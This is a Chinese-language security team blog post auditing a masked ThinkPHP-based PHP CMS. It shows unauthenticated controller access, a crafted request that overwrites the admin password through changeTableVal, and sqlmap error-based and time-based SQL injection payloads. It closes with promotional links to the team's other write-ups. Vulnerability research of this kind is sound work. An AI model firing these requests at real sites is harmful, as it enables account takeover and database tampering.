#  手把手教你审计PHP CMS漏洞 | 某腾CMS漏洞实战案例分析   
原创 C4安全团队运营  Code4th安全团队   2025-02-14 00:05  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRfP3YQ1YMgSOYpU6bib2XT1zkeOcS3nLmxTGCIMvAibwZgxlhGMlJ4h3FDPFfAj7TdcT0h3vADuxWA/640?wx_fmt=png&from=appmsg "")  
  
代码审计是保障Web应用安全的关键环节，但往往被许多开发者和企业忽视。无论是小型的个人网站，还是大型的电商、金融平台，代码的安全性都至关重要。在这个数字化时代，代码漏洞可能直接导致数据泄露、资金损失甚至法律风险，因此，发现并修复代码中的漏洞，是每个开发者和安全人员的责任。  
  
PHP代码审计的复杂性往往藏在代码的深处——从输入验证、数据处理到权限控制，任何一环的设计疏漏都可能成为攻击者的“入场券”，而多数开发者甚至企业的安全团队都对此缺乏系统认知。  
  
团队将分享典型的PHP代码CMS审计思路，希望师傅们能从中看到代码审计的另一种视角。有不明白的地方，欢迎加入我的交流群一起探讨交流。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/EXTCGqBpVJRfP3YQ1YMgSOYpU6bib2XT1jz01tUoqiaRPztxJPZuiaibkvvDuSwib7mRVg5VIUIIvEWl2VLawRj6icQQ/640?wx_fmt=jpeg "")  
  
**前言**  
  
  
  
**PHP CMS入口在哪里？**  
  
这里的某腾CMS在最早期的挖掘过程中，作为代码审计练手的案例，给了我很多审计上面的经验  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRfP3YQ1YMgSOYpU6bib2XT1ibdnTp34vvPLLSoejHB6ic4qib91qnibLt6UZjrl0DXLa9EfuPsubXA3Gg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRfP3YQ1YMgSOYpU6bib2XT1mBzZRFM0yAKqtYM7bxng9E7YnOPYNiafZszpFl3o75BWYqoXQX82phw/640?wx_fmt=png&from=appmsg "")  
  
  
某腾CMS是基于ThinkPHP二次开发的内容管理系统，在某些方面继承了ThinkPHP的框架漏洞  
  
常见的命令执行利用方法是修复了的，但是自带的组件，比如Ueditor组件没有做鉴权，导致了文件上传等漏洞，下面是详细的审计文档  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRfP3YQ1YMgSOYpU6bib2XT1tL4PYkWx8PGYz5uAuMkckVwJC6t66IJIkB94615W8wkAP0ALhY2vyQ/640?wx_fmt=png&from=appmsg "")  
  
  
该PHP CMS主页截图如下  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRfP3YQ1YMgSOYpU6bib2XT1HBic2TsrUqAouaWRcD2G12JwnZUAhpBqm00npfibnsKtqq3U3pDs1Gwg/640?wx_fmt=png&from=appmsg "")  
  
  
咱们来看下CMS的入口在哪里，ThinkPHP的对应路径访问方法遵从以下的规则：  
  
```
application路径下查看文件，根据以下对应的请求路径得到
m=mingteng&c=Uploadify&a=upload
m  --> 目录
c  --> controller文件
a  --> 方法
```  
  
  
/application文件夹内容如下，参数m可以指定访问的文件夹名称，这里有common、home、mingteng都可以访问下面的文件和对应方法  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/EXTCGqBpVJRfP3YQ1YMgSOYpU6bib2XT11VFs661FhuRT6YFFLXF8ZnS4h0Djia6Agg3ZLl4aWGiac5El3wp4LfdQ/640?wx_fmt=jpeg "")  
  
  
/mingteng/controller文件夹内容如下  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRfP3YQ1YMgSOYpU6bib2XT13uXute3a6lUV9icpwN6ibjXEiavpFjwBEI0Ur4BX0IvZdmYibWtx4Yb22w/640?wx_fmt=png&from=appmsg "")  
  
  
以文件夹其中的Uploadify.php文件为例，查看源码发现info数组里面是可以调用的方法  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRfP3YQ1YMgSOYpU6bib2XT1ibYt4vMkXgkx5CPueM7cqIicdibwkYwc93gcYVg8v2IKtibwicjXGeM8BJg/640?wx_fmt=png&from=appmsg "")  
  
请求传参m=mingteng&c=Uploadify&a=fileList，调用fileList方法为查看temp目录下的所有文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRfP3YQ1YMgSOYpU6bib2XT1p4RxITpOg1VjV8ibMmzzahZJthjNpmsRsibVSDyLGWlmCBPjfd4rD9vA/640?wx_fmt=png&from=appmsg "")  
  
这样捋清楚了请求方法，就能调用每个文件里面的方法且没有权限验证，一个个试结合代码审计，总能出洞  
  
  
**挖掘案例**  
  
  
  
**SQL注入出洞就是那么简单**  
  
在代码审计的过程中，我在控制器Index.php中发现了和数据库相关的参数名称  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRfP3YQ1YMgSOYpU6bib2XT1y93Vl2Qw6Pj3lj7MNugVpZQjbZbZNIdBwNrAZZPwuqHTiaJG7dONZ2Q/640?wx_fmt=png&from=appmsg "")  
  
  
没有权限验证也可以调用该changeTableVal中的方法  
  
构造：  
```
https://xxxx/index.php?m=mingteng&c=Index&a=changeTableVal&table=admin&id_name=admin_1&id_value=1&field=password&value=49ba59abbe56e057
```  
  
  
对照down下来的sql样例文件，构造一个类似的修改数据库功能路径，SQL语句执行是没有权限验证的。这里构造的第一步table为存在的表名，id_name设为不存在的键值  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRfP3YQ1YMgSOYpU6bib2XT114kouDFbSU27S522sQIzjMLtL7f4xtoySA20126KIia3AMsUIPcXekA/640?wx_fmt=png&from=appmsg "")  
  
  
此处存在update语句的SQL注入漏洞，可以使用sqlmap进行验证  
  
```
Parameter: id_name (GET)
 Type: error-based
 Title: MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)
Payload: m=mingteng&c=Index&a=changeTableVal&table=admin&id_name=GTID_SUBSET(CONCAT(0x716b786b71,(SELECT (ELT(4471=4471,1))),0x71706a7a71),4471)&id_value=1&field=password&value=49ba59abbe56e057
 Type: time-based blind
 Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
Payload: m=mingteng&c=Index&a=changeTableVal&table=admin&id_name=(SELECT 7655 FROM (SELECT(SLEEP(5)))GTMX)&id_value=1&field=password&value=49ba59abbe56e057
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRfP3YQ1YMgSOYpU6bib2XT10KJWnOMBZr6NTD9SVic5B4icxKzS0CicfvY6gz7NIPHhc2d1Gqe34iaQyw/640?wx_fmt=png&from=appmsg "")  
  
  
关于某腾的PHP CMS的代码审计的记录文档，已经放在团队的最新Freebuf知识大陆中，只是个红队内部小圈子  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRfP3YQ1YMgSOYpU6bib2XT1UvfRc5lESnK0kvomswnFgNEclbrdYNdiaR1icQgZkDlXjtGcb8tR9wKg/640?wx_fmt=png&from=appmsg "")  
  
扫码即可加入查看文档详细内容  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRfP3YQ1YMgSOYpU6bib2XT1IHYPzH7vpdQnZ7tGHCYRyyh8GtGLFAONGUsPTqPJ9tPiabXl9ZIKSZg/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
  
用友U8cloud，  
是用友推出的新一代云ERP，主要聚焦成长型、创新型企业，提供企业级云ERP整体解决方案。  
用友U8Cloud在全版本中存在反序列化漏洞。未经授权的攻击者可以通过访问FileTransportServlet类时构造恶意请求包。  
  
[](https://mp.weixin.qq.com/s?__biz=MzkzMzE5OTQzMA==&mid=2247485780&idx=1&sn=13897dbb76848e06e02f82ceeb9f02f9&scene=21#wechat_redirect)  
  
  
华天动力OA存在多个历史漏洞，结合源码进行分析。  
华天动力是我国首批OA企业,是双软认证的高新技术企业,专注  
OA办公系统  
20余年,开放免费OA系统下载试用,旗下OA产品累计为37500多个客户提供高效OA办公体验。  
  
[](https://mp.weixin.qq.com/s?__biz=MzkzMzE5OTQzMA==&mid=2247485708&idx=1&sn=42524032a2389e079ddd6bc610e512c5&scene=21#wechat_redirect)  
  
  
**致远A8**  
，又称致远互联A8  
协同管理软件  
，是面向中型、大型、集团型组织（集团版OA）的数字化协同运营中台。A8版本的系统小版本较多，本次分析用的是致远A8 V7 SP1版本源码。  
  
[](http://mp.weixin.qq.com/s?__biz=MzkzMzE5OTQzMA==&mid=2247484688&idx=1&sn=928f50f70991a1979dcefb8d02cb02d6&chksm=c2516e39f526e72fae6fe053cf7ab537692bd5581a5552dfe7bfcee0588bd7e5c0d793f2f84b&scene=21#wechat_redirect)  
  
  
  
  
  
  
  
END  
  
  
  
关注Cod  
e4th安全团队  
  
了解更多安全相关内容~  
  
